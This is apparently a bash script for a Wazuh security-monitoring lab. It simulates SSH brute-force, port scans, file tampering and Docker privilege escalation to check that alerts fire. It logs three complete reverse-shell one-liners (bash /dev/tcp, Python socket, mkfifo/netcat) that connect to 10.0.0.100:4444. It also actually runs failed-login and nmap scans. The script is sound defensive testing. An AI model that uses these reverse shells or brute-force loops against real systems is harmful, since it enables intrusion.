#!/bin/bash
# =============================================================================
# SOC Attack Simulation Script
# File: scripts/simulate_attack.sh
# Description: Simulates common attack scenarios to verify Wazuh detection
#              Rules matching: brute-force, reverse shell, FIM, port scan,
#              docker privilege escalation.
# Usage: bash simulate_attack.sh [scenario]
# Scenarios: all | bruteforce | reverseshell | fim | portscan | docker
# =============================================================================

set -euo pipefail

TARGET_HOST="${TARGET_HOST:-localhost}"
SSH_PORT="${SSH_PORT:-22}"
TARGET_USER="${TARGET_USER:-testuser}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════╗"
    echo "║         Wazuh SOC Attack Simulator v1.0          ║"
    echo "║      For authorized lab/testing use ONLY          ║"
    echo "╚══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

info()    { echo -e "${GREEN}[*]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
attack()  { echo -e "${RED}[ATTACK]${NC} $*"; }
section() { echo -e "\n${CYAN}════════════════════════════════${NC}"; echo -e "${CYAN}  $*${NC}"; echo -e "${CYAN}════════════════════════════════${NC}"; }

confirm() {
    echo -e "${RED}[WARNING]${NC} You are about to run: $1"
    read -rp "Continue? (yes/no): " ans
    [[ "$ans" == "yes" ]] || { warn "Skipped."; return 1; }
    return 0
}

# ============================================================
# Scenario 1: SSH Brute-Force Simulation
# ============================================================
sim_bruteforce() {
    section "SSH Brute-Force Simulation"
    info "Triggering 15 failed SSH auth attempts against $TARGET_HOST:$SSH_PORT"
    attack "Sending failed SSH logins (invalid passwords)..."

    for i in $(seq 1 15); do
        sshpass -p "wrongpassword$i" ssh \
            -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 \
            -p "$SSH_PORT" \
            "${TARGET_USER}@${TARGET_HOST}" exit 2>/dev/null || true
        echo -n "."
        sleep 0.5
    done
    echo ""
    info "Done. Wazuh should trigger rule 100200 (brute-force) and block the IP."
}

# ============================================================
# Scenario 2: Reverse Shell Commands in Logs
# ============================================================
sim_reverseshell() {
    section "Reverse Shell Attempt Simulation"
    warn "Writing suspicious reverse-shell commands to syslog to trigger Wazuh FIM/log rules"

    LOCAL_IP="10.0.0.100"
    attack "Logging bash reverse shell pattern..."
    logger -t "attack_sim" "bash -i >& /dev/tcp/${LOCAL_IP}/4444 0>&1"

    sleep 1
    attack "Logging Python reverse shell pattern..."
    logger -t "attack_sim" "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${LOCAL_IP}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

    sleep 1
    attack "Logging mkfifo/netcat reverse shell..."
    logger -t "attack_sim" "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LOCAL_IP} 4444 >/tmp/f"

    info "Done. Check for Wazuh rules 100300-100302."
}

# ============================================================
# Scenario 3: File Integrity Modification
# ============================================================
sim_fim() {
    section "Suspicious File Modification (FIM) Simulation"

    warn "This modifies /tmp files and touches monitored paths."
    if ! confirm "FIM simulation (touches /tmp and may modify test files)"; then return; fi

    attack "Creating a suspicious executable in /tmp..."
    echo '#!/bin/bash\nexec /bin/sh' > /tmp/evil_payload_$(date +%s).sh
    chmod +x /tmp/evil_payload_*.sh

    attack "Simulating passwd modification (via logger — no actual changes)..."
    logger -t "fim_sim" "wazuh-syscheck: File '/etc/passwd' modified. Changed attributes: size,mtime,md5."

    attack "Simulating crontab modification..."
    logger -t "fim_sim" "wazuh-syscheck: File '/etc/crontab' modified. Changed attributes: mtime,md5."

    info "Done. Check for Wazuh rules 100400-100402."
}

# ============================================================
# Scenario 4: Port Scan (via nmap)
# ============================================================
sim_portscan() {
    section "Port Scan Detection Simulation"

    if ! command -v nmap &>/dev/null; then
        warn "nmap not found. Installing..."
        apt-get install -y nmap 2>/dev/null || yum install -y nmap 2>/dev/null || {
            warn "Cannot install nmap. Skipping port scan simulation."
            return
        }
    fi

    if ! confirm "Port scan against $TARGET_HOST (nmap SYN scan)"; then return; fi

    attack "Running nmap SYN scan against $TARGET_HOST..."
    nmap -sS -T4 -p 1-1000 "$TARGET_HOST" -oN /tmp/portscan_result_$(date +%s).txt || true
    info "Done. Suricata/Wazuh should flag rules 100600-100601."
}

# ============================================================
# Scenario 5: Docker Privilege Escalation
# ============================================================
sim_docker_escape() {
    section "Docker Privilege Escalation Simulation"

    if ! command -v docker &>/dev/null; then
        warn "Docker not available. Skipping."
        return
    fi

    attack "Logging docker socket mount pattern to trigger rule 100501..."
    logger -t "docker_sim" "docker run -v /var/run/docker.sock:/var/run/docker.sock --privileged alpine"

    attack "Logging docker exec pattern..."
    logger -t "docker_sim" "docker exec -it some_container /bin/bash"

    info "Done. Check for Wazuh rules 100500-100502."
}

# ============================================================
# Main dispatcher
# ============================================================
banner

SCENARIO="${1:-all}"

case "$SCENARIO" in
    all)
        sim_bruteforce
        sim_reverseshell
        sim_fim
        sim_portscan
        sim_docker_escape
        ;;
    bruteforce)   sim_bruteforce ;;
    reverseshell) sim_reverseshell ;;
    fim)          sim_fim ;;
    portscan)     sim_portscan ;;
    docker)       sim_docker_escape ;;
    *)
        echo "Usage: $0 [all|bruteforce|reverseshell|fim|portscan|docker]"
        exit 1
        ;;
esac

section "Simulation Complete"
info "Check the Wazuh Dashboard at https://localhost:443 for triggered alerts."
info "Alert logs: /var/ossec/logs/alerts/alerts.json"
